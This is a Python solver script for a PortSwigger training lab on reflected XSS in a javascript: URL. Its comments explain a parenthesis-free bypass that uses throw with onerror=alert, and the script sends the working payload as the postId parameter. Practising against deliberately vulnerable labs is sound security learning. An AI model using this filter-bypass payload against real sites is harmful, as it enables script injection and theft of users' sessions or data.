# Lab 26 — Reflected XSS in a JavaScript URL with some characters blocked
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-with-some-characters-blocked
#
# Vulnerability: Back link on post pages — postId param reflected into javascript: href
# Aim:           Call alert without parentheses (blocked)
#
# Technique:
#   The back link href is a javascript: URI containing a fetch() call:
#     javascript:fetch('/analytics',{method:'post',body:'/post?postId=5'}).finally(_=>window.location='/')
#   The postId is embedded in the fetch body string.
#
#   Parentheses are blocked — can't call alert() normally.
#   Bypass: use throw + onerror:
#     - Set window.onerror = alert  → alert becomes the uncaught exception handler
#     - throw 1337                  → raises an exception → alert(1337) is called
#     - All without a single ()
#
#   Full payload injected into the URL (replaces postId):
#     &'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+''
#
#   Breakdown:
#     &'}   — closes the fetch body string and the options object
#     ,x=x=>{throw/**/onerror=alert,1337}  — arrow fn: sets onerror=alert then throws
#     ,toString=x,window+''  — coerces window to string → calls toString (which is x) → throws
#
# Usage: python xss_lab26.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, check_reflection

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = "&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+''"

if __name__ == "__main__":
    banner()
    section("LAB 26 — REFLECTED XSS: javascript: URL, PARENTHESES BLOCKED")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab26.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # The payload goes into postId — reflected into the javascript: href
    print(f"  ➜  Sending payload as postId:\n     {PAYLOAD}\n")
    r = session.get(f"{url}/post", params={"postId": PAYLOAD})

    check_reflection(r.text, PAYLOAD, "javascript: URL payload")

    print()
    print("  ➜  Open this URL in a browser and click the 'Back to Blog' link:")
    print(f"     {r.url}")
    print()
    print("  ℹ  throw + onerror = alert pattern:")
    print("     window.onerror = alert  → uncaught exceptions call alert()")
    print("     throw 1337              → throws → alert(1337) — no () needed")
